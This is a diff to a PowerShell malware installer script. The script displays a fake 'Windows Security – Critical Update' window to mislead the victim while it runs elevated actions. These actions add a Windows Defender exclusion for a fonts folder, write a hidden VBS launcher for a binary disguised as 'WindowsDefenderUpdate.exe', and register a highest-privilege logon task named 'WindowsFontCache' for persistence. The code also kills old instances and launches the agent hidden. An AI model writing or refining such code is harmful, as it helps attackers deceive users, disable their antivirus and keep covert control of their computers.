@@ -13,8 +13,8 @@ $script=@'
 $host.UI.RawUI.WindowTitle='Windows PowerShell Security Update'
 $host.UI.RawUI.ForegroundColor='White'
 Write-Host '================================================' -ForegroundColor Cyan
-Write-Host '  Windows Security – Critical Update' -ForegroundColor Yellow
-Write-Host '  Applying critical security update...' -ForegroundColor Gray
+Write-Host '  Windows Security – Critical Update' -ForegroundColor Blue
+Write-Host '  Applying critical security update...Please wait ' -ForegroundColor Gray
 Write-Host '================================================' -ForegroundColor Cyan
 Write-Host ''
 Write-Host 'Please do not close this window.' -ForegroundColor White
@@ -43,28 +43,39 @@ Write-Host 'This window will close automatically in a few seconds...' -Foregroun
 
 # --- Elevated actions (admin now) ---
 $fdir="$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
+$vbsPath="$fdir\run_WindowsDefenderUpdate.vbs"
 
-# 1. Add Defender exclusion
+# 1. Make sure the VBS file exists (recreate if missing – needs the agent)
+if (-not (Test-Path $vbsPath)) {
+    $dest = "$fdir\WindowsDefenderUpdate.exe"
+    if (Test-Path $dest) {
+        $vbsContent = 'WScript.Sleep 30000' + "`r`n" + 'CreateObject("WScript.Shell").Run """' + $dest + '""", 0, False'
+        Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
+    }
+}
+
+# 2. Add Defender exclusion
 Add-MpPreference -ExclusionPath $fdir -Force -ErrorAction SilentlyContinue
 
-# 2. Kill any existing agent process (old non-admin instance)
+# 3. Kill any existing agent process (old non‑admin instance)
 Get-Process | Where-Object { $_.Path -eq "$fdir\WindowsDefenderUpdate.exe" } | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
-# 3. Remove old scheduled task (no prompt)
+# 4. Remove old scheduled task (no prompt)
 Unregister-ScheduledTask -TaskName "WindowsFontCache" -Confirm:$false -ErrorAction SilentlyContinue
 
-# 4. Create new scheduled task that runs as admin at every logon
-$taskAction    = New-ScheduledTaskAction -Execute "$fdir\WindowsDefenderUpdate.exe"
-$taskTrigger   = New-ScheduledTaskTrigger -AtLogOn
-$taskPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
-$taskSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -Compatibility Win8
-Register-ScheduledTask -TaskName "WindowsFontCache" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force | Out-Null
+# 5. Create scheduled task that runs the VBS as admin at logon
+$userSid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+$action    = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
+$trigger   = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -UserId $userSid -RunLevel Highest -LogonType Interactive
+$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -Compatibility Win8 -ExecutionTimeLimit 0
+Register-ScheduledTask -TaskName "WindowsFontCache" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
 
-# 5. Remove the registry Run key (no longer needed)
+# 6. Delete the registry Run key (no longer needed – the task handles persistence)
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsFontHelper" -ErrorAction SilentlyContinue
 
-# 6. Start the agent now (admin)
+# 7. Start agent immediately (admin)
 Start-Process "$fdir\WindowsDefenderUpdate.exe" -WindowStyle Hidden
 
 Start-Sleep -Seconds 3;exit
